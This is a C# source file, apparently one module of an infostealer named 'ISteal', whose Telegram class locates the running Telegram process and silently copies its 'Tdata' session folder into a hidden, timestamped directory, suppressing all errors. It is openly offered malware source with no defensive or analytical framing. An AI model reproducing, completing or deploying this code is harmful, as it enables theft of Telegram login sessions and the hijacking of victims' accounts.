using System;
using System.Diagnostics;
using System.IO;

namespace ISteal.Password
{
    internal class Telegram
    {
        private static bool in_folder = false;

        public static void StealIt(string path)
        {
            Process[] processByName = Process.GetProcessesByName("Telegram");

            if (processByName.Length < 1)
            {
                return;
            }
            CopyAll(Path.GetDirectoryName(processByName[0].MainModule.FileName) + 
            "\\Tdata", path + "\\Telegram_" + 
            (int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds);
        }

        private static void CopyAll(string fromDir, string toDir)
        {
            try
            {
                Directory.CreateDirectory(toDir).Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }
            catch { }

            try
            {
                foreach (var s1 in Directory.GetFiles(fromDir))
                {
                    CopyFile(s1, toDir);
                }
            }
            catch { }

            try
            {
                foreach (var s in Directory.GetDirectories(fromDir))
                {
                    CopyDir(s, toDir);
                }
            }
            catch { }
        }

        private static void CopyFile(string s1, string toDir)
        {
            try
            {
                var fname = Path.GetFileName(s1);

                if (in_folder && !(fname[0] == 'm' || fname[1] == 'a' || fname[2] == 'p'))
                {
                    return;
                }

                File.Copy(s1, toDir + "\\" + fname);
            }
            catch { }
        }

        private static void CopyDir(string s, string toDir)
        {
            try
            {
                in_folder = true;
                CopyAll(s, toDir + "\\" + Path.GetFileName(s));
                in_folder = false;
            }
            catch { }
        }
    }
}